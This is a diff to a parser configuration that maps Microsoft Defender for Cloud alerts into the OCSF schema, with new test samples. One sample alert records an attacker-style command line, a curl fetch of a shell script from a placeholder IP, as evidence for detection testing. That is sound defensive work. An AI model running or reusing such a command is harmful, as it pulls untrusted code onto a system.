@@ -20,7 +20,9 @@ description: >
   Alerts carry SystemAlertId as finding_info.uid, AlertType as the analytic,
   intent / techniques as ATT&CK attacks, the affected Azure resource on
   resources[], and the ip / host / account / process / file entities on
-  evidences[]. Alert severity High / Medium / Low / Informational maps to the
+  evidences[] (one evidence per entity; Log Analytics rows that carry Entities,
+  Techniques or Tactics as JSON text are decoded; hex and decimal process ids).
+  Alert severity High / Medium / Low / Informational maps to the
   OCSF severity; status Active / New -> New, InProgress -> In Progress,
   Dismissed -> Suppressed, Resolved -> Resolved. Assessments map status
   Healthy / Passed -> Pass, Unhealthy / Failed -> Fail, NotApplicable / Skipped
@@ -178,10 +180,17 @@ parser_vrl: |
       if pcomp != "" { finding_info.product = { "name": pcomp } }
 
       # ---- MITRE ATT&CK: techniques + intent (kill-chain tactics) ----
+      # Log Analytics rows hold multi-valued columns as JSON array text
+      # ("[\"T1078\",\"T1110\"]"); other paths use an array or "A, B" text.
+      tactic_list = array(r.intent) ?? array(r.tactics) ?? []
+      if length(tactic_list) == 0 {
+          it_txt = string(r.intent) ?? string(r.tactics) ?? ""
+          it_arr, it_err = parse_json(it_txt)
+          if it_err == null && is_array(it_arr) { tactic_list = array!(it_arr) } else if it_txt != "" { tactic_list = split(it_txt, ",") }
+      }
       tactics = []
-      intent = string(r.intent) ?? string(r.tactics) ?? ""
-      for_each(split(intent, ",")) -> |_i, it| {
-          name = strip_whitespace(string!(it))
+      for_each(tactic_list) -> |_i, it| {
+          name = strip_whitespace(to_string(it) ?? "")
           if name != "" && downcase(name) != "unknown" && downcase(name) != "preattack" {
               tactics = push(tactics, { "name": name })
           }
@@ -189,7 +198,8 @@ parser_vrl: |
       techs = array(r.techniques) ?? []
       if length(techs) == 0 {
           ts_txt = string(r.techniques) ?? ""
-          if ts_txt != "" { techs = split(ts_txt, ",") }
+          ts_arr, ts_err = parse_json(ts_txt)
+          if ts_err == null && is_array(ts_arr) { techs = array!(ts_arr) } else if ts_txt != "" { techs = split(ts_txt, ",") }
       }
       attacks = []
       for_each(techs) -> |_i, tq| {
@@ -200,7 +210,11 @@ parser_vrl: |
               attacks = push(attacks, a)
           }
       }
-      if length(attacks) == 0 && length(tactics) > 0 { attacks = [{ "tactics": tactics }] }
+      # Intent without techniques: one attack per tactic (OCSF needs a tactic,
+      # technique or sub_technique on each attack).
+      if length(attacks) == 0 {
+          attacks = map_values(tactics) -> |tc| { { "tactic": tc } }
+      }
       if length(attacks) > 0 { finding_info.attacks = attacks }
 
       # ---- status: New / Active / InProgress / Resolved / Dismissed ----
@@ -213,58 +227,82 @@ parser_vrl: |
       if st == "dismissed" { status_id = 3; status = "Suppressed"; activity_id = 2; activity_name = "Update" }
       if st == "resolved" { status_id = 4; status = "Resolved"; activity_id = 3; activity_name = "Close" }
 
-      # ---- entities -> evidence (first of each kind) ----
-      evidence = {}
-      device = {}
-      for_each(array(r.entities) ?? []) -> |_i, e| {
+      # ---- entities -> evidences[], one per ip / host / account / process / file ----
+      # Log Analytics rows carry Entities as JSON text; decode it, then read the
+      # keys lower-cased like the rest of the record. $ref entries repeat an
+      # entity already listed and carry no type, so they are skipped.
+      entities = array(r.entities) ?? []
+      if length(entities) == 0 {
+          en_txt = string(r.entities) ?? ""
+          en_arr, en_err = parse_json(en_txt)
+          if en_err == null && is_array(en_arr) {
+              lowered = map_keys({ "v": en_arr }, recursive: true) -> |k| { downcase(k) }
+              entities = array(lowered.v) ?? []
+          }
+      }
+      evidences = []
+      for_each(entities) -> |_i, e| {
           eo = object(e) ?? {}
           et = downcase(string(eo.type) ?? "")
-          if et == "ip" && !exists(evidence.src_endpoint) {
+          ev = {}
+          if et == "ip" {
               addr = string(eo.address) ?? ""
-              if addr != "" { evidence.src_endpoint = { "ip": downcase(addr) } }
+              if addr != "" { ev.src_endpoint = { "ip": downcase(addr) } }
           }
-          if et == "host" && length(device) == 0 {
+          if et == "host" {
               hn = string(eo.hostname) ?? ""
-              if hn != "" { device = { "hostname": hn, "type_id": 0 } }
-              osf = string(eo.osfamily) ?? ""
-              if osf != "" && length(device) > 0 {
-                  os_type = 0
-                  if downcase(osf) == "windows" { os_type = 100 }
-                  if downcase(osf) == "linux" { os_type = 200 }
-                  device.os = { "name": osf, "type_id": os_type }
+              if hn != "" {
+                  device = { "hostname": hn, "type_id": 0 }
+                  osf = string(eo.osfamily) ?? ""
+                  if osf != "" {
+                      os_type = 0
+                      if downcase(osf) == "windows" { os_type = 100 }
+                      if downcase(osf) == "linux" { os_type = 200 }
+                      device.os = { "name": osf, "type_id": os_type }
+                  }
+                  ev.device = device
               }
           }
-          if et == "account" && !exists(evidence.user) {
+          if et == "account" {
               un = string(eo.name) ?? ""
               if un != "" {
-                  evidence.user = { "name": un }
+                  user = { "name": un }
                   sid = string(eo.sid) ?? ""
-                  if sid != "" { evidence.user.uid = sid }
+                  if sid != "" { user.uid = sid }
                   ntd = string(eo.ntdomain) ?? ""
-                  if ntd != "" { evidence.user.domain = ntd }
+                  if ntd != "" { user.domain = ntd }
+                  ev.user = user
               }
           }
-          if et == "process" && !exists(evidence.process) {
-              # OCSF needs a pid on a process; Defender writes it in hex.
-              pid_txt = downcase(string(eo.processid) ?? "")
-              pid, pid_err = parse_int(replace(pid_txt, "0x", ""), base: 16)
-              if pid_err == null && starts_with(pid_txt, "0x") {
+          if et == "process" {
+              # OCSF needs a pid on a process. Windows alerts write it in hex
+              # ("0x1f2c"), Linux alerts and normalized feeds in decimal.
+              pid_txt = downcase(strip_whitespace(to_string(eo.processid) ?? ""))
+              pid = -1
+              if starts_with(pid_txt, "0x") {
+                  hp, hp_err = parse_int(replace(pid_txt, "0x", ""), base: 16)
+                  if hp_err == null { pid = hp }
+              } else if match(pid_txt, r'^\d+$') {
+                  pid = to_int(pid_txt) ?? -1
+              }
+              if pid >= 0 {
                   proc = { "pid": pid }
                   cl = string(eo.commandline) ?? ""
                   if cl != "" { proc.cmd_line = cl }
-                  evidence.process = proc
+                  ev.process = proc
               }
           }
-          if et == "file" && !exists(evidence.file) {
+          if et == "file" {
               fnm = string(eo.name) ?? ""
               if fnm != "" {
-                  evidence.file = { "name": fnm, "type_id": 1 }
+                  file = { "name": fnm, "type_id": 1 }
                   dirp = string(eo.directory) ?? ""
-                  if dirp != "" { evidence.file.parent_folder = dirp }
+                  if dirp != "" { file.parent_folder = dirp }
+                  ev.file = file
               }
           }
+          if length(ev) > 0 { evidences = push(evidences, ev) }
       }
-      if length(device) > 0 { evidence.device = device }
 
       remediation = {}
       steps = array(r.remediationsteps) ?? []
@@ -304,7 +342,7 @@ parser_vrl: |
           "finding_info": finding_info
       }
       if length(resource) > 0 { ocsf.resources = [resource] }
-      if length(evidence) > 0 { ocsf.evidences = [evidence] }
+      if length(evidences) > 0 { ocsf.evidences = evidences }
       if length(remediation) > 0 { ocsf.remediation = remediation }
       conf = downcase(string(r.confidencelevel) ?? "")
       if conf == "low" { ocsf.confidence_id = 1; ocsf.confidence = "Low" }
@@ -892,7 +930,7 @@ samples:
       "finding_info.uid": "2517184898549829577_cdcf9f94-ec53-47a6-ab87-76130f87218d"
       "finding_info.analytic.uid": "ARM_AnomalousServiceOperation.CredentialAccess"
       "evidences.0.src_endpoint.ip": "203.0.113.142"
-      "evidences.0.device.hostname": "Sample-VM"
+      "evidences.1.device.hostname": "Sample-VM"
       "resources.0.name": "Sample-VM"
       "cloud.account.uid": "00000000-0000-0000-0000-000000000000"
       "time": "1683811029017"
@@ -904,8 +942,8 @@ samples:
       "finding_info.title": "Suspicious process executed"
       "finding_info.attacks.0.technique.uid": "T1059"
       "finding_info.attacks.1.tactics.1.name": "DefenseEvasion"
-      "evidences.0.process.pid": "7980"
-      "evidences.0.user.name": "svc_web"
+      "evidences.2.process.pid": "7980"
+      "evidences.1.user.name": "svc_web"
       "remediation.desc": "Review the process command line and the user account that ran it.\nIf the activity is unexpected, isolate the machine and run a full antimalware scan."
       "finding_info.product.name": "Servers"
   # source: https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/securityalert
@@ -974,6 +1012,28 @@ samples:
     expect:
       "class_uid": "0"
       "unmapped.parse_fallback": "Event Hubs records envelope (explode upstream)"
+  # neon review #78: Log Analytics Entities / Techniques / Tactics as JSON text are decoded.
+  # source: https://learn.microsoft.com/en-us/azure/azure-monitor/reference/tables/securityalert
+  - raw: "{\"TenantId\":\"00000000-0000-0000-0000-000000000000\",\"TimeGenerated\":\"2026-11-03T02:14:09.5510000Z\",\"DisplayName\":\"Suspicious download using curl detected\",\"AlertName\":\"Suspicious download using curl detected\",\"AlertSeverity\":\"Medium\",\"Description\":\"Analysis of host data detected the use of curl to download a script from a remote address.\",\"ProviderName\":\"Detection\",\"VendorName\":\"Microsoft\",\"SystemAlertId\":\"bbbb2222-cccc-3333-dddd-444444444444\",\"ResourceId\":\"/subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/rg-linux/providers/Microsoft.Compute/virtualMachines/vm-linux-07\",\"AlertType\":\"VM_SuspectDownloadArtifacts\",\"ConfidenceLevel\":\"\",\"IsIncident\":false,\"StartTime\":\"2026-11-03T02:10:00.0000000Z\",\"EndTime\":\"2026-11-03T02:11:00.0000000Z\",\"ProcessingEndTime\":\"2026-11-03T02:14:00.0000000Z\",\"RemediationSteps\":\"[\\\"Review the downloaded file and the process tree.\\\"]\",\"ExtendedProperties\":\"{\\\"resourceType\\\":\\\"Virtual Machine\\\"}\",\"Entities\":\"[{\\\"$id\\\":\\\"2\\\",\\\"Address\\\":\\\"198.51.100.44\\\",\\\"Type\\\":\\\"ip\\\"},{\\\"$id\\\":\\\"3\\\",\\\"HostName\\\":\\\"vm-linux-07\\\",\\\"OSFamily\\\":\\\"Linux\\\",\\\"Type\\\":\\\"host\\\"},{\\\"$id\\\":\\\"4\\\",\\\"Name\\\":\\\"deploy\\\",\\\"Host\\\":{\\\"$ref\\\":\\\"3\\\"},\\\"Type\\\":\\\"account\\\"},{\\\"$id\\\":\\\"5\\\",\\\"ProcessId\\\":\\\"4321\\\",\\\"CommandLine\\\":\\\"/usr/bin/curl -s http://198.51.100.44/x.sh\\\",\\\"Host\\\":{\\\"$ref\\\":\\\"3\\\"},\\\"Type\\\":\\\"process\\\"}]\",\"SourceSystem\":\"Detection\",\"ProductName\":\"Azure Security Center\",\"ProductComponentName\":\"Servers\",\"Status\":\"New\",\"CompromisedEntity\":\"vm-linux-07\",\"Tactics\":\"[\\\"Execution\\\",\\\"CommandAndControl\\\"]\",\"Techniques\":\"[\\\"T1059\\\",\\\"T1105\\\"]\",\"Type\":\"SecurityAlert\"}"
+    expect:
+      "class_uid": "2004"
+      "evidences.0.src_endpoint.ip": "198.51.100.44"
+      "evidences.1.device.hostname": "vm-linux-07"
+      "evidences.2.user.name": "deploy"
+      "evidences.3.process.pid": "4321"
+      "finding_info.attacks.0.technique.uid": "T1059"
+      "finding_info.attacks.1.technique.uid": "T1105"
+      "finding_info.attacks.0.tactics.1.name": "CommandAndControl"
+  # neon review #78: one evidence per entity; decimal processId.
+  # source: https://learn.microsoft.com/en-us/rest/api/defenderforcloud-composite/alerts
+  - raw: "{\"id\":\"/subscriptions/00000000-0000-0000-0000-000000000000/resourceGroups/rg-example/providers/Microsoft.Security/locations/westeurope/alerts/2518298467986649000_eeee5555-ffff-6666-aaaa-777777777777\",\"name\":\"2518298467986649000_eeee5555-ffff-6666-aaaa-777777777777\",\"type\":\"Microsoft.Security/Locations/alerts\",\"properties\":{\"status\":\"Active\",\"timeGeneratedUtc\":\"2026-11-03T03:00:12.0000000Z\",\"vendorName\":\"Microsoft\",\"alertDisplayName\":\"Successful brute force attack\",\"alertType\":\"VM_LoginBruteForceSuccess\",\"compromisedEntity\":\"vm-jump-01\",\"description\":\"Several sign in attempts were detected from multiple sources, followed by a successful sign in.\",\"intent\":\"CredentialAccess\",\"startTimeUtc\":\"2026-11-03T02:40:00.0000000Z\",\"endTimeUtc\":\"2026-11-03T02:59:00.0000000Z\",\"systemAlertId\":\"2518298467986649000_eeee5555-ffff-6666-aaaa-777777777777\",\"productName\":\"Microsoft Defender for Cloud\",\"severity\":\"High\",\"entities\":[{\"$id\":\"1\",\"address\":\"192.0.2.1\",\"type\":\"ip\"},{\"$id\":\"2\",\"address\":\"192.0.2.2\",\"type\":\"ip\"},{\"$id\":\"3\",\"name\":\"alice\",\"type\":\"account\"},{\"$id\":\"4\",\"name\":\"bob\",\"type\":\"account\"},{\"$id\":\"5\",\"processId\":4321,\"commandLine\":\"sshd: alice [priv]\",\"type\":\"process\"},{\"$ref\":\"3\"}]}}"
+    expect:
+      "evidences.0.src_endpoint.ip": "192.0.2.1"
+      "evidences.1.src_endpoint.ip": "192.0.2.2"
+      "evidences.2.user.name": "alice"
+      "evidences.3.user.name": "bob"
+      "evidences.4.process.pid": "4321"
+      "finding_info.attacks.0.tactic.name": "CredentialAccess"
   # NAN-3702: an unparseable record gets the deterministic sha256("defender_for_cloud|raw|" + raw) uid.
   - raw: "NAN-3702 determinism probe: not a defender_for_cloud record"
     expect:
